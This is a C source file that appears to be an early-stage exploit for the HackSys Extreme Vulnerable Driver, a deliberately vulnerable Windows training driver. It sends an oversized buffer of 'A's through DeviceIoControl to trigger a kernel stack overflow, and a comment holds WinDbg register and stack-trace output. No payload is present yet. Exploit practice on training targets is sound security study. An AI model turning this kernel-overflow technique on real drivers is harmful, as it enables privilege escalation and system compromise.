#include <Windows.h>
#include <Psapi.h>
#include <stdlib.h>
#include <stdio.h>

//ioctl code to trigger Stack Overflow vulnerability
#define IOCTL_CODE 0x222003

int main()
{
    //Create Handle to HEVD Driver
    HANDLE drivObjHndl = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    //Check if handle is valid
    if (drivObjHndl == INVALID_HANDLE_VALUE)
    {
        printf("No handle to driver :(\n");
        exit(-1);
    }

    //variable for DeviceIoControl->lpBytesReturned parameter
    DWORD bytesRtrnd;

    printf("Setting up payload!\n");

    //Overflow Buffer in HEVD
    char payload[69];

    //Fill with 'A'
    memset(payload, 'A', sizeof(payload));

    //Send exploit to driver
    DeviceIoControl(drivObjHndl, IOCTL_CODE, payload, sizeof(payload), NULL, 0, &bytesRtrnd, NULL);

    /*
    Stack after non-overflowing buffer:
    eax=00000000 ebx=a0169980 ecx=67c65513 edx=00000001 esi=8475e1a6 edi=a0169910
    eip=8ff3519a esp=aaf83a6c ebp=aaf83a6c iopl=0         nv up ei ng nz ac pe nc
    cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000296
    HEVD!BufferOverflowStackIoctlHandler+0x1c:
    8ff3519a 8bc8            mov     ecx,eax

    Goal: Get address in HEVD to return to (maybe in one of the registers, idfk)

    Stack trace:
    # ChildEBP RetAddr      
    00 b0a37a6c 92ce40ba     HEVD!TriggerBufferOverflowStack+0xdc [c:\projects\hevd\driver\hevd\bufferoverflowstack.c @ 117] 
    01 b0a37a88 83870038     HEVD!IrpDeviceIoCtlHandler+0x56 [c:\projects\hevd\driver\hevd\hacksysextremevulnerabledriver.c @ 277] 
    02 b0a37aa4 83b79854     nt!IofCallDriver+0x48
    03 b0a37af0 83b75fe7     nt!IopSynchronousServiceTail+0x134
    04 b0a37bb8 83b75baa     nt!IopXxxControlFile+0x437
    05 b0a37be4 8399249b     nt!NtDeviceIoControlFile+0x2a
        <Intermediate frames may have been skipped due to lack of complete unwind>
    06 b0a37be4 76f92740 (T) nt!KiSystemServicePostCall
        <Intermediate frames may have been skipped due to lack of complete unwind>
    07 0061fdb4 76f90e3a (T) ntdll!KiFastSystemCallRet
    08 0061fdb8 7533a56a     ntdll!NtDeviceIoControlFile+0xa
    WARNING: Frame IP not in any known module. Following frames may be wrong.
    09 0061fe18 75bffcae     0x7533a56a
    0a 0061fe48 004016a2     0x75bffcae
    0b 0061fec8 0040138b     0x4016a2
    0c 0061ff68 75bfcfc9     0x40138b
    0d 0061ff80 76f226b5     0x75bfcfc9
    0e 0061ffdc 76f22689     ntdll!__RtlUserThreadStart+0x2b
    0f 0061ffec 00000000     ntdll!_RtlUserThreadStart+0x1b 

    Registers @ nt!IofCallDriver+0x48:
    eax=00000000 ebx=0000010e ecx=00000000 edx=00010003 esi=8cff0b10 edi=9f627108
    eip=83870038 esp=b0a37a98 ebp=b0a37aa4 iopl=0         nv up ei pl zr na pe nc
    cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
    nt!IofCallDriver+0x48:
    83870038 5e              pop     esi
    */

    CloseHandle(drivObjHndl);
}
